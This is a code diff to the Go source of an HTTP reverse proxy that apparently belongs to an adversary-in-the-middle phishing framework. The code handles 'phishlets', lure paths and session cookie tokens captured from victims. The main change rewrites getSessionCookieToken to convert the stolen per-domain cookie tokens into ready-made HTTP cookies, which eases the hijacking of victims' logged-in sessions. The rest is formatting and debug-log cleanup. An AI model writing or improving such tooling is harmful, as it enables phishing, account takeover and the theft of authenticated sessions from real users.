@@ -553,10 +553,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Debug("sid: %s", sid)
 							log.Debug("cookietoken: %s", p.getSessionCookieToken(sid))
 						}
-						log.Debug("sid: %s", sid)
+
 					}
 				}
-
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
@@ -1554,7 +1553,6 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			return len(hosts[i]) > len(hosts[j])
 		})
 
-		
 		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
 			u, err := url.Parse(s_url)
 			if err == nil {
@@ -2009,11 +2007,11 @@ func (p *HttpProxy) genAccessUrl(url string) string {
 	return accessUrl
 }
 
-func (p *HttpProxy) getSessionCookieToken (sessionId string) map[string]map[string]*database.CookieToken {
+func (p *HttpProxy) getSessionCookieToken(sessionId string) []*http.Cookie {
 	id, err := strconv.Atoi(sessionId)
-		if err != nil {
-			return nil
-		}
+	if err != nil {
+		return nil
+	}
 	sessions, err := p.db.ListSessions()
 	if err != nil {
 		return nil
@@ -2023,6 +2021,7 @@ func (p *HttpProxy) getSessionCookieToken (sessionId string) map[string]map[stri
 		return nil
 	}
 	s_found := false
+	var CookieTokens map[string]map[string]*database.CookieToken
 	for _, s := range sessions {
 		if s.Id == id {
 			_, err := p.cfg.GetPhishlet(s.Phishlet)
@@ -2031,13 +2030,27 @@ func (p *HttpProxy) getSessionCookieToken (sessionId string) map[string]map[stri
 				return nil
 			}
 			s_found = true
-			return s.CookieTokens
+			CookieTokens = s.CookieTokens
 		}
 	}
 	if !s_found {
 		log.Error("id %d not found", id)
 	}
-	return nil
+	var cookies []*http.Cookie
+	ck := &http.Cookie{}
+	for domain, tmap := range CookieTokens {
+		for k, v := range tmap {
+			ck = &http.Cookie{
+				Name:     k,
+				Value:    v.Value,
+				Path:     v.Path,
+				Domain:   domain,
+				HttpOnly: v.HttpOnly,
+			}
+			cookies = append(cookies, ck)
+		}
+	}
+	return cookies
 }
 
 type dumbResponseWriter struct {
@@ -2087,5 +2100,3 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
 }
-
-
